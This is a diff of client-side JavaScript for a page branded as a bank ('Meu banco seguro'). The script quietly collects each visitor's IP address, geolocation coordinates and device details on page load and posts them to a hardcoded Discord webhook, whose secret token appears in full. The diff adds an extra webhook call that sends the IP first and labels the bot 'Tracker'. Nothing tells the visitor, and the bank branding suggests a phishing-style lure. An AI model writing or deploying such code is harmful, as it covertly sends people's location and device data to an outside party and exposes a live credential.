@@ -3,7 +3,6 @@ document.addEventListener("DOMContentLoaded", () => {
   const webhook =
     "https://discord.com/api/webhooks/1390153902997110834/xm_XiN-z6dT1teIIOo0aJqwPRgabEYbdH1zWEF4m1_08FCPk7GZFpfRd9tXSaIMLIdUl";
 
-  // Funções de manipulação de cookies
   function setCookie(name, value, days) {
     const date = new Date();
     date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
@@ -22,17 +21,15 @@ document.addEventListener("DOMContentLoaded", () => {
   async function getIpInfo() {
     try {
       const ipResponse = await $.get("https://api64.ipify.org?format=json");
-      const ipData = await $.get(
-        `https://freeipapi.com/api/json/${ipResponse.ip}`
-      );
+      const ipData = await $.get(`http://ip-api.com/json/${ipResponse.ip}`);
 
       return {
         ip: ipResponse.ip,
-        city: ipData.cityName || "Desconhecido",
+        city: ipData.city || "Desconhecido",
         state: ipData.regionName || "Desconhecido",
         isProxy: ipData.isProxy || false,
-        latitude: ipData.latitude?.toString() || "Desconhecido",
-        longitude: ipData.longitude?.toString() || "Desconhecido",
+        latitude: ipData.lat?.toString() || "Desconhecido",
+        longitude: ipData.lon?.toString() || "Desconhecido",
       };
     } catch (error) {
       return {
@@ -77,12 +74,24 @@ document.addEventListener("DOMContentLoaded", () => {
     const deviceInfo = getDeviceInfo();
     const ipInfo = await getIpInfo();
 
+    // Envia primeiro webhook com apenas o IP
+    $.ajax({
+      url: webhook,
+      type: "POST",
+      contentType: "application/json",
+      data: JSON.stringify({
+        content: `🛰️ IP detectado: \`${ipInfo.ip}\``,
+        username: "IP Inicial | Tracker",
+      }),
+      success: () => console.log("IP enviado."),
+      error: (err) => console.error("Erro ao enviar IP:", err),
+    });
+
+    // Envia segundo webhook com dados completos
     const collectedData = {
       ...deviceInfo,
       ...ipInfo,
     };
-
-    console.log("Enviando dados:", collectedData);
 
     $.ajax({
       url: webhook,
@@ -94,9 +103,7 @@ document.addEventListener("DOMContentLoaded", () => {
           {
             title: "Dados do site",
             color: 3125065,
-            fields: [
-              { name: "Versão", value: "1.2"}
-            ],
+            fields: [{ name: "Versão", value: "1.2" }],
             author: {
               name: "slx10",
               url: "https://github.com/slx10",
@@ -129,19 +136,17 @@ document.addEventListener("DOMContentLoaded", () => {
         username: "Meu banco seguro | Tracker",
         avatar_url:
           "https://raw.githubusercontent.com/ceevdev/ceev-html/refs/heads/main/img/favicon.ico",
-        attachments: [],
       }),
       success: (response) => {
-        console.log("Dados enviados com sucesso:", response);
-        setCookie("bancoseguro_visited", "true", 7); // Define o cookie para 7 dias
+        console.log("Dados completos enviados com sucesso:", response);
+        setCookie("bancoseguro_visited", "true", 7);
       },
       error: (err) => {
-        console.error("Erro ao enviar dados:", err);
+        console.error("Erro ao enviar dados completos:", err);
       },
     });
   }
 
-  // Verificar se os dados já foram enviados
   if (!debug && !getCookie("bancoseguro_visited")) {
     sendData();
   } else {
